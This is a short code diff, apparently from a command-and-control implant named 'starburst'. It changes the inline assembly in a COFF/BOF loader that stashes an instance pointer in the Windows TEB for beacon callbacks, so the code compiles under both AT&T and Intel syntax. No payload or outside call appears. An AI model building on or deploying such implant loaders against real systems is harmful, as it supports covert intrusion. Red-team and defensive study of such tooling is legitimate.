@@ -69,14 +69,14 @@ struct COFF_RELOCATION {
 // TEB.ArbitraryUserPointer helpers for passing instance to callbacks
 static inline auto declfn coff_set_inst( instance* p ) -> void {
 #ifdef _M_X64
-    __asm__ volatile ( "movq %0, %%gs:0x28" :: "r"(p) : "memory" );
+    __asm__ volatile ( "{movq %0, %%gs:0x28|mov qword ptr gs:[0x28], %0}" :: "r"(p) : "memory" );
 #endif
 }
 
 static inline auto declfn coff_get_inst() -> instance* {
 #ifdef _M_X64
     instance* p;
-    __asm__ volatile ( "movq %%gs:0x28, %0" : "=r"(p) );
+    __asm__ volatile ( "{movq %%gs:0x28, %0|mov %0, qword ptr gs:[0x28]}" : "=r"(p) );
     return p;
 #else
     return nullptr;
@@ -498,7 +498,7 @@ auto declfn starburst::cmd_execute_coff(
     // save old ArbitraryUserPointer, set instance for beacon callbacks
     void* old_aup = nullptr;
 #ifdef _M_X64
-    __asm__ volatile ( "movq %%gs:0x28, %0" : "=r"(old_aup) );
+    __asm__ volatile ( "{movq %%gs:0x28, %0|mov %0, qword ptr gs:[0x28]}" : "=r"(old_aup) );
 #endif
     coff_set_inst( &inst );
 
